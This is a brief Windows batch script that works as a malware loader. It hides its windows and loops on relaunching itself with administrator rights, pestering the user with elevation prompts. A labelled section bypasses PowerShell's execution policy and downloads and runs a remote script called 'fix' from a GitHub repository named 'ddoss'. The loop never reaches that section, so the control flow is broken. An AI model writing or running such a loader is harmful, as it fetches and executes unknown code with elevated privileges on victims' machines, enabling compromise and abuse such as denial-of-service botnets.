@echo off
:retry
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
timeout /t 2 /nobreak >nul
goto retry

:admin
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://github.com/srap18/ddoss/raw/refs/heads/main/fix | iex"
exit

